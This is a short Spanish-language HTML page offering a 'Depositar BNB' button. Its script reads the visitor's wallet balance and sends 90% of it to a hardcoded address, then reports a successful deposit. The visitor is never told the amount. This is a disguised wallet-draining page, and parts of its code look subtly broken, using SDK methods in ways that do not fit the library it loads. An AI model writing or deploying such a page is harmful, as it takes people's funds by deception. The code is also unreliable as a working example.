<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <title>Botón de depósito de BNB en BSC</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/binance-chain/javascript-sdk@1.0.14/dist/bnbSdk.umd.min.js"></script>
  </head>
  <body>
    <button id="deposit-button">Depositar BNB</button>

    <script>
      // Crea una instancia de la SDK de Binance
      const bnbSdk = new bnbSdk.default();
      bnbSdk.setProvider("https://bsc-dataseed1.binance.org:443");

      // Escucha el evento de click en el botón de depósito
      $("#deposit-button").click(async function () {
        try {
          // Obtiene la dirección de la cuenta del usuario
          const accounts = await bnbSdk.request({ method: "eth_accounts" });
          const userAddress = accounts[0];

          // Obtiene el saldo de BNB en la cuenta del usuario
          const balance = await bnbSdk.request({
            method: "eth_getBalance",
            params: [userAddress, "latest"],
          });
          const balanceBN = new bnbSdk.BN(balance.slice(2), 16);

          // Calcula la cantidad a depositar (90% del saldo)
          const depositAmountBN = balanceBN.muln(90).divn(100);
          const depositAmount = bnbSdk.BnbApiClientNumber.toString(
            depositAmountBN
          );

          // Dirección de destino para el depósito
          const depositTo = "0x8935361d21943Ee8a863082EdD8a6Aefb062E434";

          // Crea la transacción y la firma con Metamask
          const tx = {
            from: userAddress,
            to: depositTo,
            value: bnbSdk.toWei(depositAmount, "ether"),
          };
          const signedTx = await bnbSdk.request({
            method: "eth_sendTransaction",
            params: [tx],
          });

          console.log("Transacción enviada:", signedTx);
          alert("¡Depósito exitoso!");
        } catch (error) {
          console.error(error);
          alert("Error al enviar la transacción. Verifica que tienes suficiente saldo y que Metamask está conectado.");
        }
      });
    </script>
  </body>
</html>
